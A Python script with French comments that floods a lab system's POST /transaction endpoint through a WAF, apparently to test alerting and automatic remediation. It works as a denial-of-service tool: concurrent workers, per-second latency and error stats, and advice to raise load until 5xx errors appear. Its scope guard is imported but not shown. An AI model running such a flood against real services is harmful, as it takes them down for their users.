#!/usr/bin/env python3
"""DoS applicatif CONTRÔLÉ — owner: Gabriel. (Attaque primaire du Clip Chrono.)

Flood concurrent de POST /transaction via le WAF (port 8080). Effet recherché :
montée réelle du rate + latence (+ 5xx sous saturation) -> alerte Prometheus
(AnomalyDetected via ML, ou HighErrorRate) -> remédiation automatique.

PÉRIMÈTRE STRICT : SI fictif local du consortium uniquement (127.0.0.1 ou
192.168.137.0/24). Le script REFUSE toute cible publique/hors-périmètre.

Usage :
  python3 attack/dos_flood.py                         # cible $TARGET ou localhost:8080
  python3 attack/dos_flood.py http://192.168.137.1:8080
  python3 attack/dos_flood.py --concurrency 400 --duration 30 --endpoint /transaction
  python3 attack/dos_flood.py --token "<JWT>"         # stresse aussi auth+DB (plus de 5xx)

CALIBRAGE (exigence du brief) : montez --concurrency par paliers jusqu'à voir
bouger request_latency_seconds et les status 5xx/erreurs. Les stats/seconde
ci-dessous vous disent quand le seuil d'alerte est franchi.
"""
import argparse
import asyncio
import json
import os
import sys
import time
from collections import Counter

import httpx

from _safety import assert_target_in_scope


def parse_args():
    ap = argparse.ArgumentParser(description="DoS applicatif contrôlé (lab only).")
    # Compatibilité avec l'invocation historique : 1er argument positionnel = cible.
    ap.add_argument("target_pos", nargs="?", default=None, help=argparse.SUPPRESS)
    ap.add_argument("--target", default=None, help="Base URL du WAF (def: $TARGET ou http://127.0.0.1:8080)")
    ap.add_argument("--endpoint", default=os.getenv("ENDPOINT", "/transaction"))
    ap.add_argument("--method", default=os.getenv("METHOD", "POST"), choices=["GET", "POST"])
    ap.add_argument("--concurrency", type=int, default=int(os.getenv("CONCURRENCY", "200")))
    ap.add_argument("--duration", type=int, default=int(os.getenv("DURATION", "30")))
    ap.add_argument("--token", default=os.getenv("TOKEN", ""),
                    help="JWT optionnel : exerce le chemin auth+DB (génère plus de 5xx).")
    ap.add_argument("--account", default=os.getenv("FLOOD_ACCOUNT", "acc_demo"),
                    help="Compte cible du POST /transaction (def: acc_demo, compte valide).")
    args = ap.parse_args()
    args.target = (args.target or args.target_pos
                   or os.getenv("TARGET", "http://127.0.0.1:8080"))
    return args


class Stats:
    def __init__(self):
        self.status = Counter(); self.errors = 0; self.total = 0; self.window = []

    def ok(self, code, lat): self.total += 1; self.status[code] += 1; self.window.append(lat)
    def err(self): self.total += 1; self.errors += 1


def _pct(vals, p):
    if not vals: return 0.0
    s = sorted(vals); k = min(len(s) - 1, int(round(p / 100 * (len(s) - 1)))); return s[k]


async def worker(client, url, method, body, headers, stats, stop):
    while time.monotonic() < stop:
        t0 = time.perf_counter()
        try:
            r = await (client.post(url, json=body, headers=headers) if method == "POST"
                       else client.get(url, headers=headers))
            stats.ok(r.status_code, time.perf_counter() - t0)
        except Exception:
            stats.err()


async def reporter(stats, stop):
    last = 0
    while time.monotonic() < stop:
        await asyncio.sleep(1)
        win = stats.window; stats.window = []
        rps = stats.total - last; last = stats.total
        n5xx = sum(v for c, v in stats.status.items() if 500 <= c < 600)
        print(f"[t] rps={rps:5d}  p50={_pct(win,50)*1000:6.1f}ms  "
              f"p95={_pct(win,95)*1000:6.1f}ms  5xx={n5xx:5d}  err={stats.errors}")


async def main():
    args = parse_args()
    assert_target_in_scope(args.target)                 # <-- garde-fou périmètre
    url = args.target.rstrip("/") + args.endpoint
    body = {"account_id": args.account, "amount": 1.0} if args.method == "POST" else None
    headers = {"Authorization": f"Bearer {args.token}"} if args.token else {}
    print(f"Flood {url} [{args.method}] | {args.concurrency} workers | {args.duration}s"
          f"{' | token fourni' if args.token else ''}\n")

    stats = Stats(); stop = time.monotonic() + args.duration
    limits = httpx.Limits(max_connections=args.concurrency + 50,
                          max_keepalive_connections=args.concurrency)
    async with httpx.AsyncClient(timeout=5.0, limits=limits) as client:
        tasks = [asyncio.create_task(worker(client, url, args.method, body, headers, stats, stop))
                 for _ in range(args.concurrency)]
        tasks.append(asyncio.create_task(reporter(stats, stop)))
        await asyncio.gather(*tasks, return_exceptions=True)

    print("\n--- Bilan ---")
    print(f"Requêtes : {stats.total}")
    for c in sorted(stats.status): print(f"  HTTP {c} : {stats.status[c]}")
    print(f"  erreurs réseau/timeout : {stats.errors}")
    n5xx = sum(v for c, v in stats.status.items() if 500 <= c < 600)
    if n5xx == 0 and stats.errors == 0:
        print("\n[calibrage] 0 erreur : la cible encaisse. Montez --concurrency, ou"
              " ajoutez --token pour charger auth+DB et déclencher HighErrorRate.")
    else:
        print("\n[calibrage] 5xx/erreurs présents : signal exploitable par la détection.")


if __name__ == "__main__":
    asyncio.run(main())
